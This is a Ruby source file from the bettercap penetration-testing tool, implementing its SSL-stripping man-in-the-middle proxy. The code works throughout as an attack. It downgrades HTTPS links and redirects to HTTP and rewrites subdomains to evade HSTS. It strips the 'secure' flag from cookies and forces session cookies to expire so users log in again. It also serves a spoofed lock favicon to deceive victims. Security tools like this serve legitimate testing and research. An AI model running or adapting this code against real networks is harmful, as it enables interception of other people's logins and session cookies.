# encoding: UTF-8
=begin

BETTERCAP

Author : Simone 'evilsocket' Margaritelli
Email  : evilsocket@gmail.com
Blog   : http://www.evilsocket.net/

This project is released under the GPL 3 license.

=end

module BetterCap
module Proxy
module SSLStrip

# Represent a stripped url associated to the client that requested it.
class StrippedObject
  # The stripped request client address.
  attr_accessor :client
  # The original URL.
  attr_accessor :original
  # The stripped version of the URL.
  attr_accessor :stripped

  # Known subdomains to replace.
  SUBDOMAIN_REPLACES = {
    'www'     => 'wwwww',
    'webmail' => 'wwebmail',
    'mail'    => 'wmail'
  }.freeze

  # Create an instance with the given arguments.
  def initialize( client, original, stripped )
    @client   = client
    @original = original
    @stripped = stripped
  end

  # Return a normalized version of +url+.
  def self.normalize( url, schema = 'https' )
    # add schema if needed
    unless url.include?('://')
      url = "#{schema}://#{url}"
    end
    # add path if needed
    unless url.end_with?('/')
      url = "#{url}/"
    end
    url
  end

  # Downgrade +url+ from HTTPS to HTTP.
  # Will take care of HSTS bypass urls in a near future.
  def self.strip( url )
    # first thing first, downgrade the protocol schema
    stripped = url.gsub( 'https://', 'http://' )
    # search for a known subdomain and replace it
    found = false
    SUBDOMAIN_REPLACES.each do |from,to|
      if stripped.include?( "://#{from}." )
        stripped = stripped.gsub( "://#{from}.", "://#{to}." )
        found = true
        break
      end
    end
    # fallback, prepend custom 'wwwww.'
    unless found
      stripped.gsub!( '://', '://wwwww.' )
    end

    Logger.debug  "[#{'SSLSTRIP'.green} '#{url}' -> '#{stripped}'"

    stripped
  end

  def self.process( url )
    normalized = self.normalize(url)
    stripped   = self.strip(normalized)
    [ normalized, stripped ]
  end
end

# Handle SSL stripping.
class Strip
  # Maximum number of redirects to detect a HTTPS redirect loop.
  MAX_REDIRECTS = 3
  # Regular expression used to parse HTTPS urls.
  HTTPS_URL_RE  = /(https:\/\/[^"'\/]+)/i

  # Create an instance of this object.
  def initialize
    @stripped = []
    @cookies  = CookieMonitor.new
    @favicon  = Response.from_file( File.dirname(__FILE__) + '/lock.ico', 'image/x-icon' )
  end

  # Return true if the +request+ was stripped.
  def was_stripped?(request)
    url = request.base_url
    @stripped.each do |s|
      if s.client == request.client and s.stripped == url
        return true
      end
    end
    false
  end

  def unstrip( request, url )
    @stripped.each do |s|
      if s.client == request.client and s.stripped == url
        return s.original
      end
    end
    url
  end

  # Check if the +request+ is a result of a stripped link/redirect and handle
  # cookies cleaning.
  # Return a response object or nil if the request must be performed.
  def preprocess( request )
    process_headers!(request)
    response = process_cookies!(request)
    if response.nil?
      process_stripped!(request)
      response = spoof_favicon!(request)
    end
    response
  end

  # Process the +request+ and if it's a redirect to a HTTPS url patch the
  # Location header and retry.
  # Process the +response+ and replace every https link in its body with
  # http counterparts.
  def process( request, response )
    # check for a redirect
    if process_redirection!( request, response )
      # retry the request
      return true
    end

    process_body!( request, response )

    # do not retry the request.
    false
  end

  private

  # Clean some headers from +request+.
  def process_headers!(request)
    request['Accept-Encoding']           = nil
    request['If-None-Match']             = nil
    request['If-Modified-Since']         = nil
    request['Upgrade-Insecure-Requests'] = nil
    request['Pragma']                    = 'no-cache'
  end

  # If +request+ has unknown session cookies, create a client redirection
  # to make them expire.
  def process_cookies!(request)
    response = nil
    # check for cookies.
    unless @cookies.is_clean?(request)
      Logger.info "[#{'SSLSTRIP'.green} #{request.client}] Sending expired cookies for '#{request.host}'."
      expired = @cookies.get_expired_headers!(request)
      response = Response.redirect( "http://#{request.host}#{request.url}", expired )
    end
    response
  end

  # If the +request+ is a result of a sslstripping operation,
  # proxy it via SSL.
  def process_stripped!(request)
    if request.port == 80 and was_stripped?(request)
      # i.e: wwww.facebook.com
      stripped   = request['Host']
      # i.e: http://wwww.facebook.com/
      url        = StrippedObject.normalize( stripped, 'http' )
      # i.e: www.facebook.com
      unstripped = unstrip( request, url ).gsub( 'https://', '' ).gsub('/', '' )

      # loop each header and fix the stripped url if needed,
      # this will fix headers such as Host, Referer, Origin, etc.
      request.headers.each do |name,value|
        if value.include?(stripped)
          request[name] = value.gsub( stripped, unstripped ).gsub( 'http://', 'https://')
        end
      end
      request.port = 443

      Logger.debug "[#{'SSLSTRIP'.green} #{request.client}] Found stripped HTTPS link '#{url}', proxying via SSL ( #{request.to_url} )."
    end
  end

  # If +request+ is the favicon of a stripped host, send our spoofed lock icon.
  def spoof_favicon!(request)
    if was_stripped?(request) and is_favicon?(request)
      Logger.info "[#{'SSLSTRIP'.green} #{request.client}] Sending spoofed favicon '#{request.to_url }'."
      return @favicon
    end
    nil
  end

  # Return true if +request+ is a favicon request.
  def is_favicon?(request)
    ( request.url.include?('.ico') or request.url.include?('favicon') )
  end

  # If the +response+ is a redirect to a HTTPS location, patch the +response+ and
  # retry the +request+ via SSL.
  def process_redirection!(request,response)
    # check for a redirect
    if response['Location'].start_with?('https://')
      original, stripped = StrippedObject.process( response['Location'] )

      @stripped << StrippedObject.new( request.client, original, stripped )

      # If MAX_REDIRECTS is reached, the 'Location' header will be used.
      response['Location'] = stripped

      # no cookies set, just a normal http -> https redirect
      if response['Set-Cookie'].empty?
        Logger.info "[#{'SSLSTRIP'.green} #{request.client}] Found redirect to HTTPS '#{original}' -> '#{stripped}'."

        # The request will be retried on port 443 if MAX_REDIRECTS is not reached.
        request.port = 443
        # retry the request if possible
        return true
      # cookies set, this is probably a redirect after a login.
      else
        Logger.info "[#{'SSLSTRIP'.green} #{request.client}] Found redirect to HTTPS ( with cookies ) '#{original}' -> '#{stripped}'."
        # we know this session, do not kill it!
        @cookies.add!( request )
        # remove the 'secure' descriptor from every cookie
        response.each_header('Set-Cookie') do |value,i|
          response.headers[i] = "Set-Cookie: #{value.gsub( /secure/, '' )}"
        end

        # do not retry request
        return false
      end
    end
    false
  end

  # Process the +response+ body and strip out every HTTPS link.
  def process_body!(request, response)
    # parse body
    links = []
    begin
      response.body.scan( HTTPS_URL_RE ).uniq.each do |link|
        if link[0].include?('.')
          links << StrippedObject.process( link[0] )
        end
      end
    # handle errors due to binary content
    rescue; end

    unless links.empty?
      Logger.debug "[#{'SSLSTRIP'.green} #{request.client}] Stripping #{links.size} HTTPS link#{if links.size > 1 then 's' else '' end} inside '#{request.to_url}'."

      links.each do |l|
        original, stripped = l
        @stripped << StrippedObject.new( request.client, original, stripped )
        response.body.gsub!( original, stripped )
      end
    end
  end
end

end
end
end
